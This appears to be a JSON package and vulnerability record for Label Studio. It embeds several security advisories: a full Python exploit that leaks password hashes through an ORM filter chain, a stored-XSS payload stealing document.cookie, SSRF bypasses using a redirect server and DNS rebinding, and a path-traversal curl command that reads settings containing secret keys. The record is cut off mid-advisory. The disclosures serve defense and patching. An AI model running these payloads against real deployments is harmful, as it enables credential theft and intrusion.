elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.1/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (==19.1.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.28)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"0afd9981a60c2896701e669e5cea52caac145eb2c543adffa568471f03974073","md5":"ceb194bc3ffe327c5ece32622dfcd902","sha256":"66e366a853bcf6496e04677868ec6a8daeb80e0a5dc6e234e56e9f4aad69baa6"},"downloads":-1,"filename":"label_studio-1.0.1-py3-none-any.whl","has_sig":false,"md5_digest":"ceb194bc3ffe327c5ece32622dfcd902","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":48756410,"upload_time":"2021-04-05T19:13:27","upload_time_iso_8601":"2021-04-05T19:13:27.983516Z","url":"https://files.pythonhosted.org/packages/0a/fd/9981a60c2896701e669e5cea52caac145eb2c543adffa568471f03974073/label_studio-1.0.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"3258a014f54ad5a6926f1f04065c89f6dc592f6c38fde8f92df1c89cdc927774","md5":"9d19b8565bfc9e12bcfb3fb70f94126c","sha256":"2e1b69c6a2850b6b831aeef2b63a8f2223e001e0bcc0479796cd65696bc276c0"},"downloads":-1,"filename":"label-studio-1.0.1.tar.gz","has_sig":false,"md5_digest":"9d19b8565bfc9e12bcfb3fb70f94126c","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":47914011,"upload_time":"2021-04-05T19:13:41","upload_time_iso_8601":"2021-04-05T19:13:41.940836Z","url":"https://files.pythonhosted.org/packages/32/58/a014f54ad5a6926f1f04065c89f6dc592f6c38fde8f92df1c89cdc927774/label-studio-1.0.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use 